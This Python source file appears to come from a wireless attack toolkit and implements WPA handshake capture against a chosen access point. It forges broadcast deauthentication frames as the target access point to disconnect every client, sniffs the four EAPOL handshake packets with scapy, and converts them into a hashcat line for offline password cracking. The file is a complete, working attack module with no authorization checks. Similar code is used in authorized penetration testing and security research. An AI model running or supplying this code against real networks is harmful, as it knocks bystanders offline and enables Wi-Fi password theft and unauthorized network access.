# core/WIFI/handshake_module.py
"""
Handshake capture against a single access point.

Public API:
    handshake(args: HandshakeArgs) -> HandshakeResult

Usage via the wrapper:
    from core.WIFI.attack_module import AttackModule
    res = AttackModule.handshake(HandshakeArgs(interface="wlan0mon", bssid="...", channel=6, ssid="..."))
"""

from __future__ import annotations

import os
import re
import signal
import subprocess
import tempfile
import threading
import time
from dataclasses import dataclass

from scapy.all import (  # type: ignore
    EAPOL,
    Dot11,
    Dot11Beacon,
    Dot11Deauth,
    Dot11ProbeResp,
    RadioTap,
    Scapy_Exception,
    sendp,
    sniff,
    wrpcap,
)

try:
    from ..debugs import debug  # type: ignore
except (ImportError, ValueError):
    import sys
    _parent = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    if _parent not in sys.path:
        sys.path.insert(0, _parent)
    from debugs import debug  # type: ignore


# ---------------------------------------------------------------------------
# Public data types
# ---------------------------------------------------------------------------

@dataclass
class HandshakeArgs:
    interface: str
    bssid: str
    channel: int
    ssid: str = ""
    capture_timeout: int = 30
    deauth_timeout: int = 30
    deauth_interval: float = 0.5
    output_path: str | None = None
    put_into_monitor: bool = True


@dataclass
class HandshakeResult:
    success: bool
    ssid: str
    bssid: str
    channel: int
    eapol_count: int = 0
    beacon_captured: bool = False
    hashcat_line: str | None = None
    output_file: str | None = None
    error: str | None = None


# ---------------------------------------------------------------------------
# Public entry point (this is what AttackModule wraps)
# ---------------------------------------------------------------------------

def handshake(args: HandshakeArgs) -> HandshakeResult:
    """Capture a WPA 4-way handshake for the given AP."""
    return _HandshakeCaptureModule(args).run()


# ---------------------------------------------------------------------------
# Implementation
# ---------------------------------------------------------------------------

class _HandshakeCaptureModule:
    def __init__(self, args: HandshakeArgs):
        self.args = args
        self.interface: str = args.interface
        self.target_bssid: str = args.bssid.upper()
        self.target_channel: int = int(args.channel)
        self.target_ssid: str = args.ssid or ""

        self.handshake_packets: list = []
        self.eapol_count: int = 0
        self.beacon_captured: bool = False
        self.stop_sniff: bool = False

        self.monitor_mode_enabled: bool = False
        self.original_interface: str | None = None
        self._deauth_thread: threading.Thread | None = None

    # -- monitor mode -------------------------------------------------------

    def _enable_monitor_mode(self) -> str:
        debug("info", f"Enabling monitor mode on {self.interface}...")
        try:
            res = subprocess.run(
                ["iwconfig", self.interface],
                check=False, capture_output=True, text=True, timeout=5,
            )
            if "Mode:Monitor" in res.stdout:
                debug("ok", f"{self.interface} already in monitor mode")
                self.monitor_mode_enabled = True
                return self.interface

            self.original_interface = self.interface
            res = subprocess.run(
                ["airmon-ng", "start", self.interface],
                check=False, capture_output=True, text=True, timeout=15,
            )
            out = (res.stdout or "").lower()
            if "monitor mode enabled" in out or "enabled on" in out:
                m = re.search(r"(\w+mon\w*)", res.stdout)
                if m:
                    self.monitor_mode_enabled = True
                    return m.group(1)

            for name in (f"{self.interface}mon", "wlan0mon", "wlan1mon"):
                chk = subprocess.run(["ifconfig", name], check=False, capture_output=True)
                if chk.returncode == 0:
                    self.monitor_mode_enabled = True
                    return name

            debug("warn", "Could not confirm monitor mode; trying anyway")
            self.monitor_mode_enabled = True
            return self.interface
        except (subprocess.SubprocessError, OSError) as e:
            debug("critical", f"Monitor mode failed: {e}")
            return self.interface

    def _cleanup_monitor_mode(self) -> None:
        if not self.monitor_mode_enabled:
            return
        try:
            if self.interface:
                subprocess.run(["ip", "link", "set", self.interface, "down"],
                               check=False, capture_output=True, timeout=5)
                subprocess.run(["iw", "dev", self.interface, "set", "type", "managed"],
                               check=False, capture_output=True, timeout=5)
                subprocess.run(["ip", "link", "set", self.interface, "up"],
                               check=False, capture_output=True, timeout=5)

            nm = subprocess.run(["systemctl", "is-active", "NetworkManager"],
                                check=False, capture_output=True, text=True)
            if nm.stdout.strip() != "active":
                os.system("systemctl start NetworkManager > /dev/null 2>&1")

            self.monitor_mode_enabled = False
            debug("ok", "Monitor mode disabled")
        except (subprocess.SubprocessError, OSError) as e:
            debug("critical", f"Cleanup failed: {e}")

    # -- helpers ------------------------------------------------------------

    def _set_channel(self, channel: int) -> None:
        try:
            subprocess.run(
                ["iw", "dev", self.interface, "set", "channel", str(channel)],
                capture_output=True, timeout=2, check=False,
            )
        except (subprocess.SubprocessError, OSError) as e:
            debug("warn", f"Failed to set channel {channel}: {e}")

    def _signal_handler(self, sig, frame) -> None:
        self.stop_sniff = True
        debug("warn", "Stopping capture...")

    # -- packet handling ----------------------------------------------------

    def _eapol_handler(self, pkt) -> None:
        try:
            if (pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp)) and pkt.haslayer(Dot11):
                bssid = pkt[Dot11].addr3
                if bssid and bssid.upper() == self.target_bssid and not self.beacon_captured:
                    self.handshake_packets.append(pkt)
                    self.beacon_captured = True
                    debug("ok", "Beacon/Probe frame captured")

            if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
                addr1 = pkt[Dot11].addr1
                addr2 = pkt[Dot11].addr2
                addr3 = pkt[Dot11].addr3
                if addr3 and addr3.upper() == self.target_bssid:
                    self.handshake_packets.append(pkt)
                    self.eapol_count += 1
                    client = addr2 if addr1.upper() == self.target_bssid else addr1
                    debug("ok",
                          f"EAPOL packet {self.eapol_count}/4 captured from {client.upper()[:8]}...")
                    if self.eapol_count >= 4:
                        self.stop_sniff = True
        except (IndexError, TypeError, AttributeError) as e:
            debug("warn", f"Failed to parse packet: {e}")

    # -- deauth loop --------------------------------------------------------

    def _send_deauth_continuous(self) -> None:
        debug("info", "Starting continuous deauth...")
        self._set_channel(self.target_channel)
        time.sleep(0.5)
        try:
            frame = (
                RadioTap()
                / Dot11(addr1="ff:ff:ff:ff:ff:ff",
                        addr2=self.target_bssid,
                        addr3=self.target_bssid)
                / Dot11Deauth(reason=7)
            )
            start = time.time()
            sent = 0
            while not self.stop_sniff:
                if time.time() - start > self.args.deauth_timeout:
                    debug("warn", f"Deauth timeout ({self.args.deauth_timeout}s)")
                    break
                sendp(frame, iface=self.interface, count=5, inter=0.1, verbose=0)
                sent += 5
                if sent % 20 == 0:
                    debug("info", f"Sent {sent} deauth packets...")
                time.sleep(self.args.deauth_interval)
            debug("ok", f"Deauth stopped (sent {sent} packets)")
        except (Scapy_Exception, OSError) as e:
            debug("error", f"Deauth failed: {e}")

    # -- capture ------------------------------------------------------------

    def _capture(self) -> bool:
        debug("info", "Starting handshake capture...")
        self.handshake_packets = []
        self.eapol_count = 0
        self.beacon_captured = False
        self.stop_sniff = False

        self._set_channel(self.target_channel)
        time.sleep(1)

        self._deauth_thread = threading.Thread(
            target=self._send_deauth_continuous, daemon=True,
        )
        self._deauth_thread.start()

        start = time.time()
        while not self.stop_sniff and self.eapol_count < 4:
            if time.time() - start > self.args.capture_timeout:
                debug("warn", f"Capture timeout ({self.args.capture_timeout}s)")
                break
            try:
                sniff(iface=self.interface, prn=self._eapol_handler, timeout=2, store=False)
            except Scapy_Exception as e:
                debug("error", f"Sniff error: {e}")
                time.sleep(0.5)

        self.stop_sniff = True
        if self._deauth_thread and self._deauth_thread.is_alive():
            self._deauth_thread.join(timeout=2)
        time.sleep(0.5)

        if self.eapol_count >= 4 and not self.beacon_captured:
            debug("warn", "No Beacon captured; one more sniff attempt...")
            try:
                sniff(iface=self.interface, prn=self._eapol_handler, timeout=3, store=False)
            except Scapy_Exception as e:
                debug("warn", f"Beacon sniff failed: {e}")

        if self.eapol_count >= 4 and self.beacon_captured:
            debug("ok", "Full handshake captured with Beacon!")
            return True
        if self.eapol_count >= 4:
            debug("warn", "EAPOL captured but missing Beacon frame")
            return False
        if self.eapol_count > 0:
            debug("warn", f"Only captured {self.eapol_count}/4 EAPOL packets")
            return False

        debug("error", "No EAPOL packets captured")
        return False

    # -- hashcat conversion -------------------------------------------------

    def _to_hashcat(self) -> str | None:
        cap = hc = None
        try:
            fd, cap = tempfile.mkstemp(suffix=".cap")
            os.close(fd)
            wrpcap(cap, self.handshake_packets)

            fd, hc = tempfile.mkstemp(suffix=".hc22000")
            os.close(fd)

            subprocess.run(
                ["hcxpcapngtool", "-o", hc, cap],
                check=False, capture_output=True, text=True,
            )

            if os.path.exists(hc) and os.path.getsize(hc) > 0:
                with open(hc, "r") as f:
                    line = f.read().strip()
                return line or None

            debug("error", "Failed to convert to hashcat format")
            return None
        except (subprocess.SubprocessError, OSError, Scapy_Exception) as e:
            debug("error", f"Conversion error: {e}")
            return None
        finally:
            for p in (cap, hc):
                if p and os.path.exists(p):
                    try:
                        os.remove(p)
                    except OSError:
                        pass

    # -- run ----------------------------------------------------------------

    def run(self) -> HandshakeResult:
        result = HandshakeResult(
            success=False,
            ssid=self.target_ssid,
            bssid=self.target_bssid,
            channel=self.target_channel,
        )

        prev_sigint = signal.getsignal(signal.SIGINT)
        try:
            signal.signal(signal.SIGINT, self._signal_handler)

            if self.args.put_into_monitor:
                self.interface = self._enable_monitor_mode()

            debug("ok",
                  f"Target: {self.target_ssid or '<Hidden>'} "
                  f"({self.target_bssid}) on channel {self.target_channel}")

            if not self._capture():
                result.error = "capture_failed"
                return result

            result.success = True
            result.eapol_count = self.eapol_count
            result.beacon_captured = self.beacon_captured
            result.hashcat_line = self._to_hashcat()

            if result.hashcat_line and self.args.output_path:
                try:
                    with open(self.args.output_path, "w") as f:
                        f.write(result.hashcat_line + "\n")
                    result.output_file = self.args.output_path
                    debug("ok", f"Saved to {self.args.output_path}")
                except OSError as e:
                    debug("error", f"Failed to save {self.args.output_path}: {e}")

            return result
        except Exception as e:  # noqa: BLE001
            debug("critical", f"Fatal error: {e}")
            result.error = str(e)
            return result
        finally:
            signal.signal(signal.SIGINT, prev_sigint)
            self._cleanup_monitor_mode()
            debug("ok", "Handshake module cleanup complete")